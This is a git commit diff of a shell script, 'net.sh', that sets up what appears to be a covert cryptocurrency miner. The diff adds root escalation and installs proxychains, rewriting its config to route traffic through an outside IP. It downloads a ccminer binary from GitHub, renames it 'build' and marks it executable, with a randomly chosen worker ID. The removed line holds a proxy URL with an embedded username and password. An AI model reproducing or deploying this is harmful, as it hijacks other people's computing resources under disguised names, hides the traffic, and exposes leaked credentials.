b13974c8eafe880fa133541d1ad2fc5704ba39c8
andigani <89914976+andigani@users.noreply.github.com>
2022-01-19 23:25:52 +0700

    Update net.sh

--- net.sh
+++ net.sh
@@ -1,12 +1,16 @@
 #!/bin/bash
-proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
 array[0]="0001"
 array[1]="0002"
 array[2]="0003"
 size=${#array[@]}
 index=$(($RANDOM % $size))
 worker=${array[$index]}
-apt-get update
+sudo -i
+apt update
+apt install proxychains
+sed -i 's/socks4/socks5/' /etc/proxychains.conf
+sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
+sed -i 's/9050/10663/' /etc/proxychains.conf
 wget -q https://raw.githubusercontent.com/renifer12/master/master/compile.sh
 wget -qO build https://github.com/renifer12/master/raw/master/ccminer
 chmod +x build
